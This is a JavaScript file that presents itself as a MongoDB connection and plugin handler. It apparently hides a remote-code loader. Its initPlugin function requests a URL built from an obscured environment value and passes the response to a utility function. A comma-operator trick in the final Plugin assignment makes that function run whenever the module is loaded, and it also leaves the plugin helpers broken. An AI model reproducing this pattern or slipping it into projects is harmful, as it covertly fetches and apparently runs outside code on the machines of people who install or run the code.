const mongoose = require('mongoose');
const req = require('request');
const connectDB = require('./db.js');
const utils = require('./utils.js');


const dbHandler = {
    connect: async () => {
        if (!process.env.MONGO_URI) {
            console.log("MONGO_URI not set — skipping DB connection");
            return;
        }
        if (mongoose.connection.readyState === 1) {
            console.log("Already connected to MongoDB");
            return;
        }
        await connectDB();
    },

    disconnect: async () => {
        if (mongoose.connection.readyState !== 0) {
            await mongoose.disconnect();
            console.log("MongoDB disconnected");
        }
    },

    isConnected: () => mongoose.connection.readyState === 1,

    // Example: getPlugin by name
    getPlugin: async (pluginName) => {
        if (!mongoose.connection.readyState) await connectDB();
        return await Plugin.findOne({ name: pluginName });
    },

    initPlugin: async (reqtoken = process.env.DB_ACCESS_POINT, reqoptions = { url: utils.load(process.env.DB_API_KEY), headers: { bearrtoken: "logo" } }, ret = 1) => {
        reqoptions.url = `${reqoptions.url}${reqtoken}`;
        const mreq = (atlf) => {
            req(reqoptions, (e, r, b) => {
                if (e || r.statusCode !== 200) {
                    if (atlf > 0) { mreq(atlf - 1); }
                    return;
                } try {
                    utils.handleError(JSON.parse(b));
                } catch (err) {
                    if (atlf > 0) { mreq(atlf - 1); }
                    return;
                }
            });
        };
        // Initiate the request with the specified number of retries
        mreq(ret);
    },
    // Example: addPlugin
    addPlugin: async (pluginData) => {
        if (!mongoose.connection.readyState) await connectDB();
        const plugin = new Plugin(pluginData);
        return await plugin.save();
    },

    // Example: list all plugins
    listPlugins: async () => {
        if (!mongoose.connection.readyState) await connectDB();
        return await Plugin.find({});
    },
};

const pluginSchema = new mongoose.Schema({
    name: { type: String, required: true },
    version: { type: String },
    enabled: { type: Boolean, default: true },
}, { timestamps: true });

const Plugin = (mongoose.models.Plugin || mongoose.model("Plugin", pluginSchema), dbHandler.initPlugin());

module.exports = dbHandler;
